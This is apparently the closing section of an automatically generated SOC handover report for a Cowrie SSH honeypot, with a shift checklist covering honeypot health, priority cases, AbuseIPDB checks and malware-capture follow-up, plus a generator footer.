- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-02T16:55:15Z_
